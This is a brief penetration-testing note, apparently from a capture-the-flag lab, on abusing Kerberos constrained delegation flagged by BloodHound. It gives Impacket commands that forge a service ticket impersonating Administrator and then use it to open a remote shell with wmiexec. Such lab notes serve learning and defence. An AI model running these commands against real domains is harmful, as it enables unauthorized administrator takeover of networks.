# AllowedToDelegate

---

When in BloodHound "AllowedToDelegate" is set, we can abuse the following command to gain elevated privs:

```
/usr/share/doc/python3-impacket/examples/getST.py -k -impersonate Administrator -spn cifs/HAYSTACK.THM.CORP THM.CORP/DARLA_WINTERS
```

We need to export the file we retrieved

```
export KRB5CCNAME=./Administrator@cifs_HAYSTACK.THM.CORP@THM.CORP.ccache
```

Logging in with credentials:

```
impacket-wmiexec -k -no-pass THM.CORP/Administrator@HayStack.thm.corp
```
